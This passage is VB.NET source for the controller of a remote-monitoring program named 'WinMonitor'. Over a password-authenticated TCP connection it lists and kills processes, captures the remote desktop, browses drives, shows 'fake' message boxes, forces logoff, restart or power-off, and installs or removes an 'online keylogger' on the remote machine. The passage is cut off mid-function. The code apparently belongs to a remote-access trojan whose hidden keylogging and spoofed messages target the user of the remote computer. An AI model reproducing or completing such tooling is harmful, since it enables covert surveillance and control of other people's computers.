        Me.imglstIcon32x32.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit
        Me.imglstIcon32x32.ImageSize = New System.Drawing.Size(32, 32)
        Me.imglstIcon32x32.ImageStream = CType(resources.GetObject("imglstIcon32x32.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.imglstIcon32x32.TransparentColor = System.Drawing.Color.Transparent
        '
        'savedlgImageFile
        '
        Me.savedlgImageFile.FileName = "doc1"
        '
        'FrmWinMonitorControler
        '
        Me.AutoScaleBaseSize = New System.Drawing.Size(5, 13)
        Me.ClientSize = New System.Drawing.Size(478, 382)
        Me.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnCancel, Me.tabServerTools, Me.lblLine1, Me.lblWelcome})
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "FrmWinMonitorControler"
        Me.Text = "WinMonitor.1.0 Server Controler"
        Me.tabServerTools.ResumeLayout(False)
        Me.tabpgeServerToolGeneralInfo.ResumeLayout(False)
        Me.tabpgeServerToolAdvanced.ResumeLayout(False)
        Me.gbxAdvancedIcon.ResumeLayout(False)
        Me.gbxAdvancedMode.ResumeLayout(False)
        Me.tabpgeServerToolProcessExplorer.ResumeLayout(False)
        Me.tabpgeServerToolMiniDesktopViewer.ResumeLayout(False)
        Me.tabpgeServerToolFakeMessenger.ResumeLayout(False)
        Me.Panel1.ResumeLayout(False)
        Me.tabpgeServerToolEnvmt.ResumeLayout(False)
        Me.tabpgeServerToolChatRoom.ResumeLayout(False)
        Me.tabpgeServerToolFunPlugins.ResumeLayout(False)
        Me.tabpgeServerToolClientOnlineKeyLogger.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

#End Region

    Private Sub GetProcessList()

        With Me.lstwProcessList
            .Clear()
            .Columns.Add("Slno", .Width * 0.5 / 5, HorizontalAlignment.Left)
            .Columns.Add("Name", .Width * 1.5 / 5, HorizontalAlignment.Left)
            '.Columns.Add("Module", .Width * 1 / 5, HorizontalAlignment.Left)
            .Columns.Add("Pid", .Width * 1 / 5, HorizontalAlignment.Left)
            .Columns.Add("Pty", .Width * 1 / 5, HorizontalAlignment.Left)
            .Columns.Add("Thrds", .Width * 1 / 5, HorizontalAlignment.Left)
            .Refresh()
        End With

        If (m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_GET_PROCESSLIST, IDS_NULL_STRING) = False) Then Return
        If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) = False) Then Return
        If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_GOT_PROCESSLIST) = False) Then Return
        Dim strProcessCollection() As String = m_strUty.ParseString(m_CmdMonitorClientGeneric.GetResult(), Chr(10))
        Dim strProcess As String : Dim intPcnt As Integer = 0
        For Each strProcess In strProcessCollection
            Dim strProcessAttributes() As String = m_strUty.ParseString(strProcess, "|"c)
            If strProcessAttributes.Length = 5 Then
                With Me.lstwProcessList
                    intPcnt += 1
                    Dim lstwItem As ListViewItem = .Items.Add(Str(intPcnt).Trim())
                    Dim indx As Integer
                    For indx = 0 To 4 Step 1
                        If (indx <> 1) Then
                            lstwItem.SubItems.Add(strProcessAttributes(indx))
                        End If
                    Next indx
                    .Refresh()
                End With
            End If
        Next strProcess
    End Sub

    Private Sub GetGeneral()
        m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_GET_COMPUSER_NAME, Nothing)
        If (Not m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric)) Then Return
        If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_GOT_COMPUSER_NAME)) Then
            Try
                Dim strarray As String() = m_strUty.ParseString(m_CmdMonitorClientGeneric.GetResult(), Chr(10))
                Me.lblComputerNameTxt.Text = strarray(0)
                Me.lblUserNameTxt.Text = strarray(1)
                strarray = Nothing
            Catch Ex As Exception : End Try
        End If
        m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_GET_MAIN_MEMORY, Nothing)
        If (Not m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric)) Then Return
        If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_GOT_MAIN_MEMORY)) Then
            Dim lngArrayLen As Long : Dim bytArray() As Byte
            If (m_CmdMonitorClientGeneric.GetResult(bytArray, lngArrayLen)) Then
                If (m_MainMemoryMonitor.SetMemoryInfoStream(bytArray)) Then
                    Dim strMemStat As String
                    Try
                        If (m_MainMemoryMonitor.GetMainMemoryStatus(strMemStat)) Then

                            Dim strarray As String() = m_strUty.ParseString(strMemStat, Chr(10))
                            lblMainMemoryUsagetxt.Text = strarray(1)
                            lblTotalMainMemorytxt.Text = strarray(0)
                            lblAvailableMainMemorytxt.Text = strarray(2)
                            strarray = Nothing
                        End If
                    Catch Ex As Exception : End Try
                    Try
                        If (m_MainMemoryMonitor.GetVirtualMemoryStatus(strMemStat)) Then

                            Dim strarray As String() = m_strUty.ParseString(strMemStat, Chr(10))
                            lblTotalVirtualtxt.Text = strarray(0)
                            lblTotalAvilableVirtualtxt.Text = strarray(1)
                            strarray = Nothing
                        End If
                    Catch Ex As Exception : End Try
                End If
            End If
        End If
    End Sub

    Private Sub GetOs()
        m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_GET_OS_VERSION, Nothing)
        Me.lblOstxt.Text = "Unknown"
        Me.lblOsExtratxt.Text = "Unknown"
        If (Not m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric)) Then Return
        If (Not Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_GOT_OS_VERSION)) Then Return
        Try
            Dim lngLen As Long
            If (Not m_OsMonitor.SetOSInfoStream(m_CmdMonitorClientGeneric.GetResult(lngLen))) Then Return
            Dim strResult As String
            If (Not m_OsMonitor.GetOSInformation(strResult)) Then Return
            Dim strarray As String() = m_strUty.ParseString(strResult, Chr(10))
            If (strarray Is Nothing) Then Return
            Me.lblOstxt.Text = strarray(0)
            Me.lblOsExtratxt.Text = strarray(1)
            strarray = Nothing
            Return
        Catch Ex As Exception
            Return
        End Try

    End Sub

    Private Sub GetDrives()
        Me.lstwDrives.Clear()
        With lstwDrives
            .Columns.Add("Drive Name", .Width * 1 / 2, HorizontalAlignment.Left)
            .Columns.Add("Drive Type", .Width * 1 / 2, HorizontalAlignment.Left)
            .Refresh()
        End With
        Try
            If (m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_GET_LOGICAL_DRIVES, Nothing) = False) Then Return
            If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) = False) Then Return
            If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_GOT_LOGICAL_DRIVES) = False) Then Return
        Catch Ex As Exception
            Return
        End Try
        Dim strarray As String() = m_strUty.ParseString(m_CmdMonitorClientGeneric.GetResult(), Chr(10))
        Dim strDrv, strDrvType As String : Dim lngDrvSze, lngDrvFree As Long
        Dim lstwItem As ListViewItem
        For Each strDrv In strarray
            Try
                If m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_GET_DRIVE_TYPE, strDrv) Then
                    If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric)) Then
                        If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_GOT_DRIVE_TYPE)) Then
                            m_CmdMonitorClientGeneric.GetDriveTypeAsString(strDrvType)
                            Dim bytDrvType As Byte : Call m_CmdMonitorClientGeneric.GetDriveType(bytDrvType)
                            Dim intImgIndx As Integer
                            Select Case bytDrvType
                                Case COMMAND_MONITOR_DRIVE_CDROM : intImgIndx = 2
                                Case COMMAND_MONITOR_DRIVE_FIXED : intImgIndx = 4
                                Case COMMAND_MONITOR_DRIVE_NOROOT : intImgIndx = 6
                                Case COMMAND_MONITOR_DRIVE_RAMDISK : intImgIndx = 1
                                Case COMMAND_MONITOR_DRIVE_REMOVABLE : intImgIndx = 3
                                Case COMMAND_MONITOR_DRIVE_REMOTE : intImgIndx = 5
                                Case COMMAND_MONITOR_DRIVE_UNKNOWN : intImgIndx = 6
                                Case Else : intImgIndx = 6
                            End Select
                            lstwItem = lstwDrives.Items.Add(strDrv.Substring(0, 2), intImgIndx)
                            lstwItem.SubItems.Add(strDrvType)
                            Try
                                If m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_GET_DRIVE_INFO, strDrv) Then
                                    If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric)) Then
                                        If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_GOT_DRIVE_INFO)) Then
                                            Dim strTmp As String = m_CmdMonitorClientGeneric.GetResult()
                                            If (strTmp = IDS_NULL_STRING) Then Throw New Exception()
                                            lstwItem.Tag = CType(strTmp, Object)
                                        Else
                                            Throw New Exception()
                                        End If
                                    Else
                                        Throw New Exception()
                                    End If
                                Else
                                    Throw New Exception()
                                End If
                            Catch Ex As Exception
                                lstwItem.Tag = IDS_DISK_INFO_NOT_AVAILABLE
                            End Try
                            lstwDrives.Refresh()
                        End If
                    End If
                End If
            Catch Ex As Exception : End Try
        Next strDrv

        Return
    End Sub

    Private Sub FrmWinMonitorControler_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        m_ServerConnectionScreenMonitor = New CTcpNetworkMonitorConnection()
        If m_ServerConnectionScreenMonitor.ConnectTo(m_ServerIp, m_ServerListenPort) Then
            m_WinMessengerScreenMonitor = New CWinMonitorMessenger()
            m_WinMessengerScreenMonitor.SetConnection(m_ServerConnectionScreenMonitor)
            m_WinMessengerScreenMonitor.SynchronizeServer()
            m_WinMessengerScreenMonitor.Authenticate(m_ServerPwd)
            m_DesktopServer = New CScreenMonitorBase()
            m_DesktopClient = New CScreenMonitorMessenger()
            m_DesktopServer.SetCompression(SCREEN_MONITOR_COMPRESS_LZSS)
        End If
        Cursor.Current = Cursors.WaitCursor
        Call GetGeneral() : Call GetOs() : Call GetDrives() ': Call GetProcessList()
        Cursor.Current = Cursors.Default

        m_usrcntrlFolderBrowser.IconSize_32x32 = False
        Call m_usrcntrlFolderBrowser.Initialize(Me.m_ServerConnectionGeneric, Me.m_WinMessengerGeneric, Me.m_CmdMonitorClientGeneric, Me.m_strUty, Me.imglstDriveIcons, Me.lstwDrives, m_ServerIp, m_ServerPwd, m_ServerListenPort)
        Return
    End Sub

    Private Sub cntxtmnuDriveExplorerProperties_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuDriveExplorerProperties.Click
        Dim frmDiskProperties As New frmDiskProperties()
        frmDiskProperties.lblCapacityTxt.Text = Me.lblTotalMainMemorytxt.Text.Trim.Substring(0, lblTotalMainMemorytxt.Text.Trim.Length - 2)
        frmDiskProperties.lblFreeTxt.Text = Me.lblAvailableMainMemorytxt.Text.Trim.Substring(0, lblAvailableMainMemorytxt.Text.Trim.Length - 2)
        frmDiskProperties.txtStorageDisk.Text = lstwDrives.SelectedItems.Item(0).Text
        frmDiskProperties.txtStorageDiskExtra.Text = lstwDrives.SelectedItems.Item(0).Text
        frmDiskProperties.txtStorageDiskExtraType.Text = "Type of disk drive is identified as " & lstwDrives.SelectedItems(0).SubItems(1).Text
        frmDiskProperties.DiskProperty = lstwDrives.SelectedItems.Item(0).Tag
        frmDiskProperties.picDriveIcon.Image = imglstDriveIcons.Images(lstwDrives.SelectedItems.Item(0).ImageIndex)
        frmDiskProperties.picDriveExtraIcon.Image = imglstDriveIcons.Images(lstwDrives.SelectedItems.Item(0).ImageIndex)
        frmDiskProperties.ShowDialog(Me)
    End Sub

    Private Sub cntxtmnuDriveExplorer_Popup(ByVal sender As Object, ByVal e As System.EventArgs) Handles cntxtmnuDriveExplorer.Popup
        If (Me.lstwDrives.SelectedIndices.Count <= 0) Then
            Me.cntxtmnuDriveExplorerProperties.Enabled = False
        Else
            Me.cntxtmnuDriveExplorerProperties.Enabled = True
        End If
    End Sub

    Private Sub btnSend_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSend.Click
        Dim bytMsgType As Byte
        Select Case True
            Case rdobtnMsgExln.Checked : bytMsgType = COMMAND_MONITOR_MSG_EXCL
            Case rdobtnMsgInfo.Checked : bytMsgType = COMMAND_MONITOR_MSG_INFO
            Case rdobtnMsgQstn.Checked : bytMsgType = COMMAND_MONITOR_MSG_QSTN
            Case rdobtnMsgStop.Checked : bytMsgType = COMMAND_MONITOR_MSG_STOP
        End Select
        If (m_CmdMonitorClientGeneric.SetFakeMessage(txtMsgText.Text, txtMsgCaption.Text, bytMsgType) = False) Then
            MessageBox.Show(IDS_FAKE_MESSAGE_SET_ERROR, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            Return
        End If
        If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) = False) Then
            MessageBox.Show(IDS_FAKE_MESSAGE_DISPLAY_ERROR, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            Return
        End If
        If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_DISPLAYED_MSG) = False) Then
            MessageBox.Show(IDS_FAKE_MESSAGE_DISPLAY_ERROR, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            Return
        End If
        MessageBox.Show(IDS_FAKE_MESSAGE_DISPLAY_OK, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
    End Sub

    Private Sub cntxtmnuBigScreenModeShowMaximized_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuBigScreenModeShowMaximized.Click
        If (m_frmExplorerFullView Is Nothing) Then
            m_frmExplorerFullView = New FrmRemoteExplorer()
            m_frmExplorerFullView.Text &= (":" & Me.lblWelcome.Text)
            m_frmExplorerFullView.m_usrcntrlFolderBrowser.IconSize_32x32 = True
            m_frmExplorerFullView.m_usrcntrlFolderBrowser.Initialize _
            (Me.m_ServerConnectionGeneric, Me.m_WinMessengerGeneric, Me.m_CmdMonitorClientGeneric, Me.m_strUty, Me.imglstIcon32x32, Me.lstwDrives, m_ServerIp, m_ServerPwd, m_ServerListenPort)
            m_frmExplorerFullView.CloseOnExit = False
            m_frmExplorerFullView.ShowDialog(Me.MdiParent)
        ElseIf (m_frmExplorerFullView.Visible = False) Then
            m_frmExplorerFullView.ShowDialog(Me.MdiParent)
        End If
    End Sub

    Protected Overrides Sub OnClosing(ByVal e As System.ComponentModel.CancelEventArgs)
        If m_boolDisConnected = False Then
            If (LoggingOff() = False) Then
                e.Cancel = True
                Return
            End If
        End If
        If Not (m_frmExplorerFullView Is Nothing) Then
            m_frmExplorerFullView.CloseOnExit = True
            m_frmExplorerFullView.Close()
            m_frmExplorerFullView = Nothing
        End If
        m_WinMessengerGeneric = Nothing
        m_ServerConnectionGeneric = Nothing
        m_CmdMonitorClientGeneric = Nothing
        m_ServerConnectionScreenMonitor = Nothing
        m_WinMessengerScreenMonitor = Nothing

        Me.m_MainMemoryMonitor = Nothing
        Me.m_OsMonitor = Nothing
        Me.m_strUty = Nothing
        Me.m_usrcntrlFolderBrowser = Nothing
    End Sub


    Private Sub SubTakeScreenShot()
        Me.lblDesktopRefreshWarning.Text = " Please wait..."
        Try
            If (m_DesktopClient.SetMessageType(SCREEN_MONITOR_TYPE_TAKE_DESKTOP) = False) Then Return
            If (m_WinMessengerScreenMonitor.ExecuteScreenMonitorMessenger(m_DesktopClient, m_DesktopServer) = False) Then Return
            m_DesktopServer.ReplaceWindowImage(Me.picboxMiniDesktopViewer.Handle)
        Catch Ex As Exception : End Try
        Me.lblDesktopRefreshWarning.Text = " Please right click and refresh !"
    End Sub

    Private Sub cntxtmnuMiniDesktopViewerRefresh_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuMiniDesktopViewerRefresh.Click
        Cursor.Current = Cursors.WaitCursor
        Call SubTakeScreenShot()
        Cursor.Current = Cursors.Default
    End Sub

    Private Sub cntxtmnuMiniDesktopViewerSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuMiniDesktopViewerSaveAsNormal.Click
        savedlgImageFile.DefaultExt = "BMP"
        savedlgImageFile.OverwritePrompt = True
        savedlgImageFile.InitialDirectory = Application.ExecutablePath
        savedlgImageFile.Filter = "Bmp files (*.BMP)|*.BMP"
        If savedlgImageFile.ShowDialog(Me) = DialogResult.Cancel Then
            Return
        ElseIf savedlgImageFile.FileName.Equals(IDS_NULL_STRING) = True Then
            m_strUty.MsgErr(IDS_FILENAME_NOT_SELECTED, IDS_SAVE_ERROR)
            Return
        End If
        If m_DesktopServer.SaveBitmapToFile(savedlgImageFile.FileName, False) = False Then
            m_strUty.MsgErr(IDS_FILE_SAVE_ERROR, IDS_SAVE_ERROR)
        End If
        Return
    End Sub

    Private Sub cntxtmnuMiniDesktopViewerSaveAsCompressed_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuMiniDesktopViewerSaveAsCompressed.Click
        savedlgImageFile.DefaultExt = "CBMP"
        savedlgImageFile.OverwritePrompt = True
        savedlgImageFile.InitialDirectory = Application.ExecutablePath
        savedlgImageFile.Filter = "CBmp files (*.CBMP)|*.CBMP"
        If savedlgImageFile.ShowDialog(Me) = DialogResult.Cancel Then
            Return
        ElseIf savedlgImageFile.FileName.Equals(IDS_NULL_STRING) = True Then
            m_strUty.MsgErr(IDS_FILENAME_NOT_SELECTED, IDS_SAVE_ERROR)
            Return
        End If
        If m_DesktopServer.SaveBitmapToFile(savedlgImageFile.FileName, True) = False Then
            m_strUty.MsgErr(IDS_FILE_SAVE_ERROR, IDS_SAVE_ERROR)
        End If
        Return
    End Sub

    Private Sub cntxtmnuMiniDesktopViewerLoadNormalImage_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuMiniDesktopViewerLoadNormalImage.Click
        opendlgOpenImageFile.DefaultExt = "BMP"
        opendlgOpenImageFile.InitialDirectory = Application.ExecutablePath
        opendlgOpenImageFile.Filter = "Bmp files (*.BMP)|*.BMP"
        If opendlgOpenImageFile.ShowDialog(Me) = DialogResult.Cancel Then
            Return
        ElseIf opendlgOpenImageFile.FileName.Equals(IDS_NULL_STRING) = True Then
            m_strUty.MsgErr(IDS_FILENAME_NOT_SELECTED, IDS_SAVE_ERROR)
            Return
        End If
        If m_DesktopServer.LoadBitmapFromFile(opendlgOpenImageFile.FileName, False) = False Then
            m_strUty.MsgErr(IDS_INVALID_FILE_FORMAT, IDS_FILEORPATH_INVALID)
            Return
        End If
        Try
            If m_DesktopServer.ReplaceWindowImage(Me.picboxMiniDesktopViewer.Handle) = False Then
                m_strUty.MsgErr(IDS_IMAGE_LOAD_FAILED, IDS_NULL_STRING)
            End If
        Catch Ex As Exception : End Try
        Return
    End Sub

    Private Sub cntxtmnuMiniDesktopViewerLoadCompressedImage_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuMiniDesktopViewerLoadCompressedImage.Click
        opendlgOpenImageFile.DefaultExt = "CBMP"
        opendlgOpenImageFile.InitialDirectory = Application.ExecutablePath
        opendlgOpenImageFile.Filter = "CBmp files (*.CBMP)|*.CBMP"
        If opendlgOpenImageFile.ShowDialog(Me) = DialogResult.Cancel Then
            Return
        ElseIf opendlgOpenImageFile.FileName.Equals(IDS_NULL_STRING) = True Then
            m_strUty.MsgErr(IDS_FILENAME_NOT_SELECTED, IDS_SAVE_ERROR)
            Return
        End If
        If m_DesktopServer.LoadBitmapFromFile(opendlgOpenImageFile.FileName, True) = False Then
            m_strUty.MsgErr(IDS_INVALID_FILE_FORMAT, IDS_FILEORPATH_INVALID)
            Return
        End If
        Try
            If m_DesktopServer.ReplaceWindowImage(Me.picboxMiniDesktopViewer.Handle) = False Then
                m_strUty.MsgErr(IDS_IMAGE_LOAD_FAILED, IDS_NULL_STRING)
            End If
        Catch Ex As Exception : End Try
    End Sub

    Private Sub btnRefreshProcessList_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnRefreshProcessList.Click
        Call GetProcessList()
    End Sub

    Private Sub cntxtmnuProcessExplorer_Popup(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuProcessExplorer.Popup
        If (lstwProcessList.SelectedIndices.Count <= 0) Then
            cntxtmnuProcessExplorerTerminateProcess.Enabled = False
            cntxtmnuProcessExplorerChangePriority.Enabled = False
        Else
            cntxtmnuProcessExplorerTerminateProcess.Enabled = True
            cntxtmnuProcessExplorerChangePriority.Enabled = True
        End If
    End Sub

    Private Sub cntxtmnuProcessExplorerTerminateProcess_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuProcessExplorerTerminateProcess.Click
        If MessageBox.Show("Are you sure to terminate the process?", "Confirm...", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) = DialogResult.No Then
            Return
        End If
        If (lstwProcessList.SelectedIndices.Count > 0) Then
            If (m_CmdMonitorClientGeneric.SetKillProcess(Val(lstwProcessList.SelectedItems(0).SubItems(2).Text)) = False) Then
                m_strUty.MsgErr("Setting kill command failed", "Command failed...")
                Return
            End If
            If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) = False) Then
                m_strUty.MsgErr("Executing kill command failed", "Command failed...")
                Return
            End If
            If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_KILLED_PROCESS) = False) Then
                m_strUty.MsgErr("kill command failed", "Command failed...")
                Return
            End If
            MessageBox.Show("Process killed", "Command succeeded...", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
            Call GetProcessList()
        End If
    End Sub

    Private Sub cntxtmnuProcessExplorerChangePriority_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cntxtmnuProcessExplorerChangePriority.Click
        If MessageBox.Show("Are you sure to change the priority?", "Confirm...", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) = DialogResult.No Then
            Return
        End If

        Dim FrmPrioritySelector As New FrmPriorities()
        If FrmPrioritySelector.ShowDialog(Me) = DialogResult.Cancel Then Return
        If (m_CmdMonitorClientGeneric.SetProcessPriority(Val(lstwProcessList.SelectedItems(0).SubItems(2).Text), FrmPrioritySelector.PriorityLevel) = False) Then
            m_strUty.MsgErr("Command setting error", "Command error...")
            Return
        End If
        If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) = False) Then
            m_strUty.MsgErr("Executing, priority changing command failed", "Command failed...")
            Return
        End If
        If (Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_SET_PROC_PRIORITY_OK) = False) Then
            m_strUty.MsgErr("Priority changing command failed", "Command failed...")
            Return
        End If
        MessageBox.Show("Priority properly changed", "Command succeeded...", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
        Call GetProcessList()
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        If (LoggingOff() = False) Then Return
        Me.Close()
    End Sub

    Private Sub StopAllThreads()

        Call btnChatExitSession_Click(New System.Object(), New System.EventArgs())
        m_WinMessengerScreenMonitor.ShutDown()
        Call UnInstallOnLineKeyLogger()
        Return
    End Sub

    Private Function LoggingOff(Optional ByVal QueryUser As Boolean = True) As Boolean
        If (m_boolDisConnected = True) Then Return True

        If (QueryUser = True) Then
            If (MessageBox.Show("Are you sure to logoff?", "Confirm...", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) = DialogResult.No) Then
                Return False
            End If
        End If

        Call StopAllThreads()

        If (m_WinMessengerGeneric.ShutDown() = True) Then
            MessageBox.Show("Logging off, Contact again...", "Logging off...", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
        Else
            m_strUty.MsgErr("Logging off not properly done...", "Logging off error...")
        End If
        m_boolDisConnected = True
        Return True
    End Function

    Private Sub btnAdvancedOk_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAdvancedOk.Click
        If (MessageBox.Show("Are you sure to continue?", "Confirm...", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) = DialogResult.No) Then
            Return
        End If
        Dim blnOk As Boolean = False
        Try
            Select Case True
                Case rdobtnLoggOff.Checked
                    blnOk = m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_LOGOFF, IDS_NULL_STRING)
                Case rdobtnRestart.Checked
                    blnOk = m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_RESTART, IDS_NULL_STRING)
                Case rdobtnShutdown.Checked
                    blnOk = m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_SHUTDOWN, IDS_NULL_STRING)
                Case Else
                    blnOk = m_CmdMonitorClientGeneric.SetCommand(COMMAND_MONITOR_POWER_OFF, IDS_NULL_STRING)
            End Select

            If (blnOk = False) Then
                m_strUty.MsgErr("Setting command failed...", "Command failed...")
                Return
            End If

            If (rdobtnAdvancedModeImmediate.Checked = True) Then
                m_CmdMonitorClientGeneric.SetSystemDownMode(True)
            End If

            If (m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) = False) Then
                m_strUty.MsgErr("Command execution failed...", "Command failed...")
                Return
            End If

            blnOk = False

            Select Case True
                Case rdobtnLoggOff.Checked
                    blnOk = Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_LOGOFF_OK)
                Case rdobtnRestart.Checked
                    blnOk = Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_RESTART_OK)
                Case rdobtnShutdown.Checked
                    blnOk = Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_SHUTDOWN_OK)
                Case Else
                    blnOk = Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), COMMAND_MONITOR_POWER_OFF_OK)
            End Select

            If (blnOk = True) Then
                MessageBox.Show("Specified operation performed...", "Command execution success...", MessageBoxButtons.OKCancel, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)
                Call LoggingOff(False)
                Me.Close()
            Else
                m_strUty.MsgErr("Command execution failed...", "Command failed...")
            End If
            Return
        Catch Ex As Exception
            m_strUty.MsgErr("Command execution failed...", "Command failed...")
        End Try
        Return
    End Sub

    Private Sub picboxMiniDesktopViewer_Paint(ByVal sender As Object, ByVal e As System.Windows.Forms.PaintEventArgs) Handles picboxMiniDesktopViewer.Paint
        Try
            m_DesktopServer.ReplaceWindowImage(Me.picboxMiniDesktopViewer.Handle)
            picboxMiniDesktopViewer.Invalidate(New System.Drawing.Region(New System.Drawing.RectangleF(0, 0, 0, 0)))
        Catch Ex As Exception : End Try
    End Sub

    Private Sub picboxMiniDesktopViewer_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles picboxMiniDesktopViewer.MouseEnter
        Try
            m_DesktopServer.ReplaceWindowImage(Me.picboxMiniDesktopViewer.Handle)
        Catch Ex As Exception : End Try
    End Sub

    Private Sub btnClearClient_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        txtChatClient.Text = IDS_NULL_STRING
    End Sub

    Private Sub btnClearServer_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles btnClearServer.KeyDown
        e.Handled = True
    End Sub

    Private Sub btnChatStartSession_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnChatStartSession.Click
        Call btnChatExitSession_Click(sender, e)
        Dim Connection As New CTcpNetworkMonitorConnection()
        If Not (Connection.ConnectTo(m_ServerIp, m_ServerListenPort)) Then
            m_strUty.MsgErr("Unable to connect to server...", "Connection error...")
            Return
        End If
        m_ChatClient = New CChatClient(Connection)
        If Not (m_ChatClient.SynchronizeServer()) Then
            m_strUty.MsgErr("Unable to synchronize  server...", "Connection error...")
            Return
        End If
        If Not (m_ChatClient.Authenticate(m_ServerPwd)) Then
            m_strUty.MsgErr("Invalid password, Unable to authenticate...", "Connection error...")
            Return
        End If
        m_blnMuxChat = False '----------Mux Init
        m_ChatThrd = New System.Threading.Thread(AddressOf ThrdChatProcListenServer)
        m_ChatThrd.Start()
        btnChatStartSession.Enabled = False
        btnChatExitSession.Enabled = True
        txtChatClient.Enabled = True
    End Sub

    Private Sub ThrdChatProcListenServer()
        Dim strFromServer As String
        While (True)
            Threading.Thread.Sleep(100)
            If (m_ChatClient.ReceieveString(strFromServer) = True) Then
                While m_blnMuxChat : End While : m_blnMuxChat = True '---Mux Wait
                If (txtChatClientReadOnly.Text.Length >= 1000) Then txtChatClientReadOnly.Text = IDS_NULL_STRING
                txtChatClientReadOnly.Text &= strFromServer
                m_blnMuxChat = False '----------Mux release
            Else
                Threading.Thread.Sleep(300)
            End If
        End While
    End Sub

    Private Sub btnChatExitSession_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnChatExitSession.Click
        If Not (m_ChatThrd Is Nothing) Then
            If m_ChatThrd.IsAlive() Then
                m_ChatThrd.Abort()
                If Not (m_ChatClient Is Nothing) Then m_ChatClient.ShutDown()
                m_ChatClient = Nothing
